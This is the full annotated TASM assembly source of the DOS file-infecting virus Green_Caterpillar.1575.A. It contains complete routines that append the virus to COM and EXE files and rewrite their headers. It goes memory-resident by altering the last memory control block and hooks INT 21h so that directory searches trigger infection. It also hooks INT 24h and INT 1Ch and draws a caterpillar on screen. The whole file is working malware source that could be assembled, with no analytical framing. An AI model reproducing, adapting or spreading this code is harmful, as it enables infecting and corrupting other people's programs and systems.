; Green_Caterpillar.1575.A
; TASM /M 


seg000		segment	byte public 'CODE'
		assume cs:seg000
		org 100h
		assume es:nothing, ss:nothing, ds:seg000

start		proc near
		jmp	short RealStart
		db 90h
Int21Ofs	dw 0
Int21Seg	dw 0
Int1COfs	dw 0
Int1CSeg	dw 0
exeHeader	dw 20CDh
exeMOD		dw 9090h
exeDIV		dw 0
exeNumSeg	dw 0
exeHeadSize	dw 0
exeMinPara	dw 0
exeMaxPara	dw 0
exeSS		dw 0
exeSP		dw 0
exeCheckSum	dw 0
exeIP		dw 0
exeCS		dw 0
StartCS		dw 0
StartIP		dw 0
FileSizeHW	dw 0
FileSizeLW	dw 0
StoreSS		dw 0
DTAOffset	dw 0
DTASegment	dw 0
StartSS		dw 0
StoreBP		dw 0
StoreES		dw 0
Int24Seg	dw 0
Int24Ofs	dw 0
GenCounter	db 16
byte_0_13C	db 7, 57h, 75h,	2, 5Ch,	7, 70h,	0, 16h,	0, 0BFh, 0Bh, 5Ch, 7, 70h, 0

RealStart:
		push	es
		push	ds
		mov	ax, es
		push	cs
		pop	ds		; DS = CS
		push	cs
		pop	es		; ES = CS
		assume es:seg000
		mov	StoreES, ax
		mov	ax, ss
		mov	StoreSS, ax
		mov	al, 2
		out	20h, al		; Interrupt controller,	8259A.
		cld	
		xor	ax, ax
		mov	ds, ax		; DS points to IVT
		assume ds:nothing
		xor	si, si
		mov	di, 13Ch
		mov	cx, 16
		repne movsb
		push	ds
		pop	ss		; SS = DS
		assume ss:nothing
		mov	bp, 8
		xchg	bp, sp
		call	near ptr sub_0_1C5
		jmp	StoreFilename
start		endp

FixupInts:
		call	GetInt24Vecs
		call	CheckInfection
		jz	AlreadyInf	; Infected Already? Then JMP.
		mov	al, ds:FileType
		push	ax
		call	InfectCOM
		pop	ax
		mov	ds:FileType, al
		jmp	short RestoreFile
		nop	

AlreadyInf:
		call	GetIntVectors
		call	CheckForInstall
		cmp	ds:FileType, 0	; No File Type?
		jnz	RestoreFile	; No? Then JMP.
		mov	ax, 4C00h
		int	21h		; Exit To DOS

RestoreFile:				; COM File?
		cmp	ds:FileType, 'C'
		jnz	RestoreEXE	; No? Then JMP.

RestoreCOM:
		pop	ds
		assume ds:seg000
		pop	es
		assume es:nothing
		push	cs
		pop	ds		; DS = CS
		pop	es
		push	es
		mov	di, offset start
		mov	si, offset exeHeader
		mov	cx, 12
		repne movsb		; Restore Original 12 Bytes
		push	es
		pop	ds		; DS = ES
		mov	ax, offset start
		push	ax
		xor	ax, ax
		retf			; Return to Original COM Program

sub_0_1C5	proc far
		mov	si, 6
		lodsw
		cmp	ax, 192h
		jz	RestoreCOM
		cmp	ax, 179h
		jnz	loc_0_1D6
		jmp	loc_0_27F

loc_0_1D6:
		cmp	ax, 1DCh
		jz	RestoreEXE
		retn	

RestoreEXE:
		pop	ds
		pop	es
		mov	bx, cs:exeSS
		sub	bx, cs:StartSS
		mov	ax, cs
		sub	ax, bx
		mov	ss, ax
		assume ss:nothing
		mov	bp, cs:StoreBP
		xchg	bp, sp
		mov	bx, cs:exeCS
		sub	bx, cs:StartCS
		mov	ax, cs
		sub	ax, bx
		push	ax
		mov	ax, cs:StartIP
		push	ax
		retf	
sub_0_1C5	endp

Caterpillar	db '#'
		db 1Ah
		db '<'
		db '#'
		db '/'
		db '-'
		db '-'
		db '!'
		db '.'
		db '$'
		db 0Eh
		db '#'
		db '/'
		db '-'
		db 'à'
FileName	db 'A:10KBYTE.EXE',0
		db    0	;  
		db  24h	; $
		db  24h	; $
		db  24h	; $
		db  24h	; $
		db  24h	; $

CheckInfection	proc near
		mov	ax, 3D02h
		mov	dx, offset FileName
		int	21h		; Open File
		jnb	CheckOpened	; No problems? Then JMP.
		clc	
		retn	

CheckOpened:
		mov	StoreSS, ax
		mov	dx, offset NewInt24
		mov	ax, 2524h
		int	21h		; Set New Int 24h Vectors
		mov	ax, 4202h
		mov	bx, StoreSS
		mov	cx, 0FFFFh
		mov	dx, 0FFFEh
		int	21h		; Move Pointer to End of File -	1
		mov	dx, offset CheckBytes
		mov	ah, 3Fh
		mov	bx, StoreSS
		mov	cx, 2
		int	21h		; Read In 2 Bytes
		mov	ah, 3Eh
		int	21h		; Close	File
		push	ds
		mov	dx, Int24Ofs
		mov	ax, Int24Seg
		mov	ds, ax
		mov	ax, 2524h
		int	21h		; Restore Int 24h Vectors
		pop	ds
		cmp	CheckBytes, 0A0Ch ; Infected Already?
		clc	
		retn	
CheckInfection	endp

CheckBytes	dw 0

loc_0_27F:
		cmp	ax, 22Dh
		jz	InfectCOM
		push	ds
		pop	es		; ES = DS
		assume es:seg000
		push	cs
		pop	ds		; DS = CS
		mov	ax, StoreSS
		mov	ss, ax		; SS = SS
		assume ss:nothing
		xchg	bp, sp
		mov	si, offset byte_0_13C
		mov	di, 0
		mov	cx, 16
		cld	
		repne movsb
		jmp	FixupInts

InfectCOM	proc near
		mov	al, 'C'
		mov	FileType, al
		mov	al, 8
		out	70h, al		; CMOS Memory:
					; used by real-time clock
		in	al, 71h		; CMOS Memory
		mov	GenCounter, al
		mov	dx, offset FileName
		mov	ax, 3D02h
		int	21h		; Open File
		jnb	COMOpened	; No problems? Then JMP.
		retn	

COMOpened:				; Store	Handle
		mov	StoreSS, ax
		mov	dx, offset exeHeader
		mov	bx, StoreSS
		mov	cx, 12
		mov	ah, 3Fh
		int	21h		; Read In 12 Bytes From	File
		mov	ax, 4202h
		xor	cx, cx
		xor	dx, dx
		int	21h		; Move Pointer to End of File
		push	ax
		add	ax, 10h
		and	ax, 0FFF0h
		push	ax
		shr	ax, 1
		shr	ax, 1
		shr	ax, 1
		shr	ax, 1		; Fix For Segment Size
		mov	di, offset VirusFixedSeg
		stosw			; Store	Segment	Value
		pop	ax
		pop	bx
		sub	ax, bx
		mov	cx, 1575
		add	cx, ax
		mov	dx, offset start
		sub	dx, ax
		mov	bx, StoreSS
		mov	ah, 40h
		int	21h		; Write	Virus to File
		mov	ax, 4200h
		xor	cx, cx
		xor	dx, dx
		int	21h		; Move Pointer to Beginning of File
		mov	ah, 40h
		mov	bx, StoreSS
		mov	cx, 12
		mov	dx, offset COMHeader
		int	21h		; Write	COM Header to File
		mov	ah, 3Eh
		mov	bx, StoreSS
		int	21h		; Close	File
		retn	
InfectCOM	endp

COMHeader:
		push	cs
		mov	ax, cs
PUSHOffset	db 5
VirusFixedSeg	dw 0			; PUSH Fixed Segment
		push	ax
		mov	ax, offset start
		push	ax
		retf	

InfectEXE	proc near
		mov	al, 'E'
		mov	FileType, al
		mov	al, 8
		out	70h, al		; CMOS Memory:
					; used by real-time clock
		in	al, 71h		; CMOS Memory
		mov	GenCounter, al
		mov	dx, offset FileName
		mov	ax, 3D02h
		int	21h		; Open EXE File
		jnb	EXEOpened	; No problems? Then JMP.
		retn	

EXEOpened:
		mov	StoreSS, ax
		mov	dx, offset exeHeader
		mov	bx, StoreSS
		mov	cx, 24
		mov	ah, 3Fh
		int	21h		; Read In 24 Bytes
		mov	ax, 4202h
		mov	cx, 0
		mov	dx, 0
		int	21h		; Move pointer to End of File
		push	ax
		add	ax, 10h
		adc	dx, 0
		and	ax, 0FFF0h
		mov	FileSizeHW, dx
		mov	FileSizeLW, ax
		mov	cx, 1831
		sub	cx, 100h
		add	ax, cx
		adc	dx, 0
		mov	cx, 512
		div	cx
		inc	ax
		mov	exeDIV,	ax
		mov	exeMOD,	dx
		mov	ax, exeCS
		mov	StartCS, ax
		mov	ax, exeIP
		mov	StartIP, ax
		mov	ax, exeSS
		mov	StartSS, ax
		mov	ax, exeSP
		mov	StoreBP, ax
		mov	dx, FileSizeHW
		mov	ax, FileSizeLW
		mov	cx, 10h
		div	cx
		sub	ax, 10h
		sub	ax, exeHeadSize
		mov	exeCS, ax
		mov	exeSS, ax
		mov	exeIP, 100h
		mov	exeSP, 100h
		mov	ax, 4200h
		xor	cx, cx
		mov	dx, 2
		int	21h		; Move Pointer to Beginning + 2
		mov	dx, offset exeMOD
		mov	bx, StoreSS
		mov	cx, 22
		mov	ah, 40h
		int	21h		; Write	New EXE	Header
		mov	ax, 4202h
		xor	cx, cx
		xor	dx, dx
		int	21h		; Move Pointer to End Of File
		mov	dx, 100h
		mov	ax, FileSizeLW
		pop	cx
		sub	ax, cx
		sub	dx, ax
		mov	cx, 1831
		add	cx, ax
		sub	cx, 100h
		mov	ah, 40h
		int	21h		; Write	Virus To File
		mov	ah, 3Eh
		int	21h		; Close	File
		retn	
InfectEXE	endp

FindFirstFile:
		push	cx
		mov	cx, 0
		mov	ah, 4Eh
		int	21h		; Find First File
		pop	cx
		retn	

GetIntVectors	proc near
		push	es
		mov	ax, 351Ch
		int	21h		; Get Int 1Ch Vectors
		mov	cs:Int1COfs, bx
		mov	cs:Int1CSeg, es
		mov	ax, 3521h
		int	21h		; Get Int 21h Vectors
		push	es
		pop	ax
		mov	cs:Int21Seg, ax
		mov	cs:Int21Ofs, bx
		pop	es
		assume es:nothing
		retn	
GetIntVectors	endp

CheckForInstall	proc near
		push	ax
		push	es
		push	ds
		xor	ax, ax
		mov	es, ax		; ES points to IVT
		assume es:nothing
		mov	si, 86h
		mov	ax, es:[si]	; Get Int 21h Segment
		mov	ds, ax
		mov	si, offset InfMarker
		cmp	word ptr [si], 0A0Ch ; In Memory Already?
		jnz	InstallVirus	; No? Then JMP.
		push	ds
		pop	ax
		call	sub_0_601
		pop	ds
		pop	es
		assume es:nothing
		pop	ax
		retn	

InstallVirus:
		push	cs
		pop	ds
		mov	ax, StoreES
		dec	ax
		mov	es, ax		; ES points to MCB
		cmp	byte ptr es:0, 'Z' ; Last MCB?
		jz	GotLastMCB	; Yes? Then JMP.
		jmp	short NotLastMCB
		nop	

GotLastMCB:				; Get Amount of	Memory in MCB
		mov	ax, es:3
CheckForInstall	endp

		mov	cx, 1847
		shr	cx, 1
		shr	cx, 1
		shr	cx, 1
		shr	cx, 1		; Calculate Paragraphs
		sub	ax, cx		; Subtract 1847	Bytes
		jb	NotLastMCB	; Enough Memory? No? Then JMP.
		mov	es:3, ax	; Set New Amount of Memory in MCB
		sub	es:12h,	cx	; Set Next Segment Value
		push	cs
		pop	ds		; DS = CS
		mov	ax, es:12h
		push	ax
		pop	es		; ES points to Virus Segment
		mov	si, offset start
		push	si
		pop	di
		mov	cx, 1575
		cld	
		repne movsb		; Copy Virus Into Memory
		push	es
		sub	ax, ax
		mov	es, ax		; ES points to IVT
		assume es:nothing
		mov	si, 84h
		mov	dx, offset NewInt21
		mov	es:[si], dx	; Set New Int 21h Offset
		inc	si
		inc	si
		pop	ax
		mov	es:[si], ax	; Set New Int 21h Segment

NotLastMCB:
		pop	ds
		pop	es
		assume es:nothing
		pop	ax
		retn	

NewInt21:				; Virus	Calling?
		cmp	al, 57h
		jnz	CheckForDTACall	; No? Then JMP.
		jmp	short JMPInt21
		nop	

CheckForDTACall:			; Set New DTA Segment/Offset
		cmp	ah, 1Ah
		jnz	CheckFindFCB	; No? Then JMP.
		call	StoreDTAVecs
		jmp	short JMPInt21
		nop	

CheckFindFCB:				; Find First File (FCB)?
		cmp	ah, 11h
		jnz	CheckFindNextMC	; No? Then JMP.
		call	FindFirstFCB
		iret	

CheckFindNextMC:			; Find Next File (FCB)?
		cmp	ah, 12h
		jnz	JMPInt21	; No? Then JMP.
		call	FindNextFCB
		iret	

JMPInt21:
		jmp	dword ptr cs:Int21Ofs

FindFirstFCB	proc near
		mov	al, 57h		; Virus	Calling
		int	21h		; Find First File (FCB)
		push	ax
		push	cx
		push	dx
		push	bx
		push	bp
		push	si
		push	di
		push	ds
		push	es
		push	cs
		pop	ds		; DS = CS
		push	cs
		pop	es		; ES = CS
		assume es:seg000
		mov	cs:InfectCount,	0
		nop	
		call	GetFilename
		jnz	GotBadFile
		call	CheckInfection
		jz	GotBadFile
		call	DoInfection
		dec	InfectCount

GotBadFile:
		pop	es
		assume es:nothing
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	bx
		pop	dx
		pop	cx
		pop	ax
		retn	
FindFirstFCB	endp

GetFilename	proc near
		push	cs
		pop	es		; ES = CS
		assume es:seg000
		push	cs
		pop	es		; ES = CS
		cld	
		call	StoreFilename
		jnb	CheckExt	; No problems? Then JMP.
		cmp	di, 0
		retn	

CheckExt:
		mov	di, offset FileName
		mov	al, '.'
		mov	cx, 11
		repne scasb		; Scan for File	Extension
		cmp	word ptr [di], 'OC' ; COM File?
		jnz	CheckForEXE	; No? Then JMP.
		cmp	byte ptr [di+2], 'M' ; COM File?
		jnz	CheckForEXE	; No? Then JMP.
		mov	FileType, 'C'
		nop	
		retn	

CheckForEXE:				; EXE File?
		cmp	word ptr [di], 'XE'
		jnz	BadFileType	; No? Then JMP.
		cmp	byte ptr [di+2], 'E' ; EXE File?
		jnz	BadFileType	; NO? Then JMP.
		mov	FileType, 'E'
		nop	

BadFileType:
		retn	
GetFilename	endp

StoreFilename	proc near
		push	ds
		mov	si, cs:DTAOffset
		mov	ax, cs:DTASegment
		mov	ds, ax
		mov	di, offset FileName
		lodsb
		cmp	al, 0FFh	; Extended FCB?
		jnz	RegularFCB	; No? Then JMP.
		add	si, 6		; Add For Extended FCB
		lodsb			; Get First Character
		jmp	short FileOnDrive
		nop	

RegularFCB:				; Is this a file on a drive?
		cmp	al, 5
		jb	FileOnDrive	; Yes? Then JMP.
		pop	ds
		stc	
		retn	

FileOnDrive:
		mov	cx, 11
		cmp	al, 0		; End of Filename?
		jz	EndOfName	; Yes? Then JMP.
		add	al, 40h		; Capitalize Drive Letter
		stosb			; Store	Drive Letter
		mov	al, ':'
		stosb

EndOfName:
		lodsb
		cmp	al, 20h		; End of Filename?
		jz	EndOFFilename	; Yes? Then JMP.
		stosb			; Store	Character
		jmp	short GetNextChar
		nop	

EndOFFilename:
		cmp	byte ptr es:[di-1], '.'
		jz	GetNextChar
		mov	al, '.'
		stosb			; Store	EXTENSION Marker

GetNextChar:
		loop	EndOfName
		mov	al, 0
		stosb			; Store	End of Filename
		pop	ds
		clc	
		retn	
StoreFilename	endp

FindNextFCB	proc near
		mov	al, 57h		; Virus	Call
		int	21h		; Find Next File (FCB)
		push	ax
		push	cx
		push	dx
		push	bx
		push	bp
		push	si
		push	di
		push	ds
		push	es
		push	cs
		pop	ds		; DS = CS
		push	cs
		pop	es		; ES = CS
		cmp	cs:InfectCount,	0 ; Infected one yet?
		jz	CheckFile	; No? Then JMP.
		jmp	short BadFile
		nop	

CheckFile:
		call	GetFilename
		jnz	BadFile		; Bad? Then JMP.
		call	CheckInfection
		jz	BadFile		; Infected Already? Then JMP.
		call	DoInfection
		dec	InfectCount
		pop	es
		assume es:nothing
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	bx
		pop	dx
		pop	cx
		pop	ax
		retn	

BadFile:
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	bx
		pop	dx
		pop	cx
		pop	ax
		retn	
FindNextFCB	endp

InfectCount	db 0

StoreDTAVecs	proc near
		push	ax
		push	ds
		pop	ax
		mov	cs:DTASegment, ax
		mov	cs:DTAOffset, dx
		pop	ax
		retn	
StoreDTAVecs	endp

GetInt24Vecs	proc near
		push	cs
		mov	al, 0
		out	20h, al		; Interrupt controller,	8259A.
		mov	ax, 3524h
		int	21h		; Get Int 24h Vectors
		mov	Int24Ofs, bx
		mov	bx, es
		mov	Int24Seg, bx
		pop	es
		mov	si, offset Caterpillar
		mov	di, offset FileName
		mov	cx, 15

loc_0_5FA:
		lodsb
		add	al, 20h
		stosb
		loop	loc_0_5FA
		retn	
GetInt24Vecs	endp

sub_0_601	proc near
		push	ax
		push	cs
		pop	ds		; DS = CS
		push	cs
		pop	es		; ES = CS
		assume es:seg000
		mov	bl, GenCounter
		cmp	bl, 0Ch
		ja	loc_0_648
		cmp	bl, 0
		jz	loc_0_648
		mov	al, 8
		out	70h, al		; CMOS Memory:
					; used by real-time clock
		in	al, 71h		; CMOS Memory
		cmp	al, 0Ch
		ja	loc_0_648
		cmp	al, 0
		jz	loc_0_648
		cmp	al, bl
		jz	loc_0_648
		inc	bl
		call	CheckCounter
		cmp	al, bl
		jz	loc_0_648
		inc	bl
		call	CheckCounter
		cmp	al, bl
		jz	loc_0_648
		pop	ds
		call	FillWithSpace
		push	cs
		pop	ds		; DS = CS
		retn	
sub_0_601	endp

CheckCounter	proc near
		cmp	bl, 12		; Counter Below	or Equal to 12?
		jbe	Below12		; Yes? Then JMP.
		sub	bl, 12		; Reset	Counter

Below12:
		retn	
CheckCounter	endp

loc_0_648:
		pop	ax
		retn	

DoInfection	proc near
		mov	dx, offset NewInt24
		mov	ax, 2524h
		int	21h		; Set New Int 24h Vectors
		cmp	FileType, 'C'   ; COM File?
		jnz	DoInfectEXE	; No? Then JMP.
		call	InfectCOM
		jmp	short InfectedFile
		nop	

DoInfectEXE:
		call	InfectEXE

InfectedFile:
		push	ds
		mov	dx, Int24Ofs
		mov	ax, Int24Seg
		mov	ds, ax
		mov	ax, 2524h
		int	21h		; Restore Int 24h
		pop	ds
		retn	
DoInfection	endp

NewInt24:
		mov	al, 3
		iret	

FillWithSpace	proc near
		mov	dx, offset NewInt1C
		mov	ax, 251Ch
		int	21h		; Set New Int 1Ch
		mov	byte ptr NewInt1C, 90h
		nop	
		mov	ax, 0B800h
		mov	es, ax		; ES points to Video Memory
		assume es:nothing
		mov	di, 0FA0h
		mov	ax, 720h
		mov	cx, 11
		repne stosw
		push	cs
		pop	es		; ES = CS
		assume es:seg000
		retn	
FillWithSpace	endp

		db    0	;  
		db    0	;  
byte_0_699	db 0
word_0_69A	dw 720h
byte_0_69C	db 0Fh,	0Ah, 0Fh, 0Ah, 0Fh, 0Ah, 0Fh, 0Ah, 0Fh
		db 0Ah,	0Fh, 0Ah, 0Fh, 0Ah, 0Fh, 0Ah, 0F7h, 0Eh
byte_0_6AE	db 0EEh
		db  0Ch	;  

NewInt1C:
		nop	
		sti	
		push	ax
		push	cx
		push	dx
		push	bx
		push	bp
		push	si
		push	di
		push	ds
		push	es
		push	cs
		pop	ds		; DS = CS
		jmp	short loc_0_6CA
		nop	

loc_0_6C0:
		pop	es
		assume es:nothing
		pop	ds
		pop	di
		pop	si
		pop	bp
		pop	bx
		pop	dx
		pop	cx
		pop	ax
		iret	

loc_0_6CA:
		mov	ax, 0B800h
		mov	es, ax		; ES points to Video Memory
		assume es:nothing
		call	sub_0_6FD
		mov	si, offset word_0_69A
		mov	cx, 22
		repne movsb
		cmp	byte_0_6AE, 0EEh
		jz	loc_0_6E9
		mov	byte_0_6AE, 0EEh
		jmp	short loc_0_6EE
		nop	

loc_0_6E9:
		mov	byte_0_6AE, 0F0h

loc_0_6EE:
		mov	ax, es:[di]
		mov	ah, 0Eh
		mov	word_0_69A, ax
		mov	byte_0_699, 0
		jmp	short loc_0_6C0

sub_0_6FD	proc near
		mov	di, 0

loc_0_700:
		mov	si, offset byte_0_69C
		push	di
		mov	cx, 18
		cld	
		rep cmpsb
		pop	di
		jz	loc_0_718
		inc	di
		inc	di
		cmp	di, 4000
		jnz	loc_0_700
		mov	di, 0

loc_0_718:
		cmp	di, 3998
		jnz	locret_0_723
		mov	byte ptr NewInt1C, 0CFh

locret_0_723:
		retn	
sub_0_6FD	endp

FileType	db 0			; E = EXE File	  C = COM File
					; 0 = 1st Generation
InfMarker	dw 0A0Ch
seg000		ends


		end start
